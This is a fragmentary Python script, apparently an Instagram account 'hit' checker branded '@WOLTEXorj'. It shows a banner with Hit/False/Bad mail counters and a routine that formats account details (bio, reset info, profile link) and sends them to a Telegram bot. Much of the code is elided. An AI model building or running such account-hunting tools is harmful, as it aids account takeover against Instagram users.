...
woltexx = render('Woltex HIGH', 
colors=['white', 'red'], align='center')
print("\x1b[1;39m—" * 60)
print(woltexx)
print("~ Programmer : @WOLTEXorj |  Channel: suanlik yok ~")
print("\x1b[1;39m—" * 60)
cyan = "\033[1m\033[36m"
c1 = '\x1b[38;5;120m'
p1 = '\x1b[38;5;150m'
...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁⠀⠀
{cyan} ════════════════       
{cyan}{c1}[𝐇𝐢𝐭] : [{M}] - {cyan} {fk}[𝐅𝐚𝐥𝐬𝐞] : [{N}] - {cyan}{p1}[𝐁𝐚𝐝] : [{O}] - {cyan}{fk}[𝐁𝐚𝐝 mail] : [{O}] 
                        @WOLTEXorj
''')
...
def q():
    try:
        ...
        if not match:
            raise Exception("yanitta istenen bulunamadi")
        M_val = match.group(2)
...
🇹🇷BIO :《{O_val}》
🇹🇷RESET :《{AR(C_val)}》
🇹🇷LINK : https://www.instagram.com/{C_val}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : @WOLTEXorj
"""
    try:
        try:
            E.get(f"{'https://api.telegram.org/bot'}{token}{'/sendMessage?chat_id='}{id}{'&text='}{K_str}")
        except I as V:
            B(" Error ")
    except:
        B("  Error ")
